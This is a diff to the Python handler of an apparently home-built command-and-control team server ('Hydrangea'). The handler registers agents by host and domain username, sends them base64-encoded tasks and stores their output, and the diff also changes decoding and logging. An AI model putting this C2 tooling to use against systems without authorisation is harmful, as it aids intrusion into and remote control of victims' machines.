@@ -2,9 +2,13 @@ import base64
 from database.database import HydrangeaDatabase
 
 # Function to handle communication with agent; takes input from agent and saves it, returns message for agent
-def handleAgentCommunication(db: HydrangeaDatabase, agentMessageB64: str):
+def handleAgentCommunication(db: HydrangeaDatabase, agentMessageBytes: bytes):
+    # Log message for Team server
+    print("Agent message received", agentMessageBytes)
+
     # Decode agent messages
-    agentMessagesDecoded = base64.b64decode(agentMessageB64.encode("utf-8")).decode("utf-8").split(b"\x00") # null-separated messages
+    agentMessages = agentMessageBytes.split(b"\x00") # null-separated messages
+    agentMessagesDecoded = map(lambda x: x.decode("utf-8"), agentMessages)
 
     # According to agent message type, perform some action; and save any output
     agentReplyArray = []
@@ -13,22 +17,14 @@ def handleAgentCommunication(db: HydrangeaDatabase, agentMessageB64: str):
 
         ## Agent registration; "AGENT_REGISTER-123ABC-HOSTNAME-USERNAME"
         if agentMessageSplit[0] == "AGENT_REGISTER":
-            if db.saveAgentInfo(
-                agentId=agentMessageSplit[1],
-                host=agentMessageSplit[2],
-                username=agentMessageSplit[3]
-            ):
-                agentReplyArray.append(f"REGISTERED-{agentMessageSplit[1]}")
-                print(f"SUCCESS: Agent {agentMessageSplit[1]} checked in; saved")
-            else:
-                print(f"ERROR: Agent {agentMessageSplit[1]} checked in but could not be saved")
+            agentId = agentMessageSplit[1]
+            host = base64.b64decode(agentMessageSplit[2].encode("utf-8")).decode("utf-8")
+            domainAndUsername = base64.b64decode(agentMessageSplit[3].encode("utf-8")).decode("utf-8")
 
-        ## Subagent registration; "SUBAGENT_REGISTER-456DEF-HOSTNAME-USERNAME"
-        elif agentMessageSplit[0] == "SUBAGENT_REGISTER":
             if db.saveAgentInfo(
-                agentId=agentMessageSplit[1],
-                host=agentMessageSplit[2],
-                username=agentMessageSplit[3]
+                agentId=agentId,
+                host=host,
+                username=domainAndUsername
             ):
                 agentReplyArray.append(f"REGISTERED-{agentMessageSplit[1]}")
                 print(f"SUCCESS: Agent {agentMessageSplit[1]} checked in; saved")
@@ -44,7 +40,7 @@ def handleAgentCommunication(db: HydrangeaDatabase, agentMessageB64: str):
             for taskNew in tasksNew:
                 taskId = taskNew.id
                 taskB64Encoded = base64.b64encode(taskNew.task.encode("utf-8")).decode("utf-8")
-                agentReplyArray.append(f"TASK-f{agentMessageSplit[1]}-{taskId}-{taskB64Encoded}") # TASK-123ABC-14-base64(input)
+                agentReplyArray.append(f"TASK-{agentMessageSplit[1]}-{taskId}-{taskB64Encoded}") # TASK-123ABC-14-base64(input)
 
         ## Task output; "TASK_OUTPUT-12-base64(output)"
         elif agentMessageSplit[0] == "TASK_OUTPUT":
@@ -62,4 +58,10 @@ def handleAgentCommunication(db: HydrangeaDatabase, agentMessageB64: str):
 
     # Prepare reply to send to Agent
     agentReplyArray = map(lambda x: x.encode("utf-8"), agentReplyArray)
-    return b"\x00".join(agentReplyArray)
+    agentReplyBytes = b"\x00".join(agentReplyArray)
+
+    # Log message for Team server
+    print("Agent reply", agentReplyBytes)
+
+    # Return reply to send back to Agent
+    return agentReplyBytes
